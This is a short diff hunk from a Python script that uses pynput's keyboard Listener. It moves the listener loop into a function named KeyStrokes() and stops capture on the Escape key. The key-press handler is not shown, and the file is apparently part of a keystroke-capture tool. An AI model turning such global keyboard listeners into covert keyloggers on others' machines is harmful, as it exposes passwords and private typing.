@@ -25,6 +25,8 @@ def ON_PRESS(key):
 def ON_RELEASE(key):
     if key == Key.esc:
         return False
-    
-with Listener(on_press=ON_PRESS, on_release=ON_RELEASE) as listner:
-    listner.join()
+
+def KeyStrokes():
+    with Listener(on_press=ON_PRESS, on_release=ON_RELEASE) as listner:
+        listner.join()
+
